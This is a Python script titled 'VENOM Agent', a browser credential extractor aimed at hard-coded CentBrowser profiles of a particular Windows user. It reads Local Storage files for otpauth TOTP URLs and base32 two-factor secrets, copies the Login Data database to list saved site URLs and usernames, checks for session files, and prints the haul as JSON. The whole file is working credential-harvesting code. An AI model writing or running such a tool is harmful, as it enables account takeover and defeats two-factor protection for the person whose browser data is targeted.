#!/usr/bin/env python3
""" VENOM Agent - Browser Cookie/Token Extractor """
import os, sys, json, sqlite3, shutil, tempfile, re
from pathlib import Path

# Profiles to scan (CentBrowser Profile 13 = Gamelover)
PROFILES = [
    "C:/Users/info/AppData/Local/CentBrowser/User Data/Profile 13",
    "C:/Users/info/AppData/Local/CentBrowser/User Data/Default",
]

results = {"hosts": {}, "tokens": [], "emails": [], "passwords": []}

for profile_path in [p for p in PROFILES if os.path.exists(p)]:
    results["profiles"] = results.get("profiles", []) + [profile_path]
    
    # Check Local Storage for 2FA tokens
    ls_path = os.path.join(profile_path, "Local Storage", "leveldb")
    if os.path.exists(ls_path):
        for f in os.listdir(ls_path):
            if f.endswith(".ldb") or f.endswith(".log"):
                fp = os.path.join(ls_path, f)
                try:
                    with open(fp, "r", errors="ignore") as fh:
                        content = fh.read()
                        # Find OTP URLs
                        for m in re.finditer(r'otpauth://totp/[^\s"\'<]+', content):
                            results["tokens"].append({"source": profile_path, "token": m.group()})
                        # Find secrets
                        for m in re.finditer(r'(?:secret|token|2fa|key)[":\s]+([A-Z2-7]{16,})', content, re.I):
                            results["tokens"].append({"source": profile_path, "secret": m.group(1)})
                except: pass

    # Check Login Data for passwords
    login_db = os.path.join(profile_path, "Login Data")
    if os.path.exists(login_db):
        try:
            tmp = tempfile.mktemp(suffix=".db")
            shutil.copy2(login_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cur.fetchall():
                results["passwords"].append({"url": row[0][:100], "username": row[1]})
            conn.close()
            os.unlink(tmp)
        except: pass

    # Check sessions
    session_file = os.path.join(profile_path, "Current Session")
    if os.path.exists(session_file):
        results["session_found"] = True

# Print results
print(json.dumps(results, indent=2))
print(f"\nProfiles: {len(PROFILES)}")
print(f"Tokens found: {len(results['tokens'])}")
print(f"Passwords: {len(results['passwords'])}")
